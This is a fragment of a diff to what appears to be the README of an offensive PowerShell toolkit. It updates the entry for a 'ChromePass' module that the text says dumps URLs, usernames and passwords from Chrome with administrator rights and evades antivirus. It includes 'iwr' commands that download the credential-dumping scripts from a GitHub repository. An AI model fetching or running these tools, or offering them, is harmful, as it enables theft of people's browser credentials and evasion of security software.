@@ -45,11 +45,11 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 
 
 ## Module Name
-   <b><i>ChromePass.exe</i></b>
-
+   <b><i>ChromePass.exe - UNDER-DEVELOP (NOT-STABLE)</i></b>
+   
 |Binary Name|Description|Privileges|Notes|
 |---|---|---|---|
-|ChromePass|dumps URLs, usernames, and passwords from chrome browser.|Administrator|ChromePass.ps1 downloads\evade detection|
+|ChromePass|dumps URLs, usernames, and passwords from chrome|Administrator|ChromePass.ps1 downloads\evade AV|
 
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.ps1" -OutFile "ChromePass.ps1"
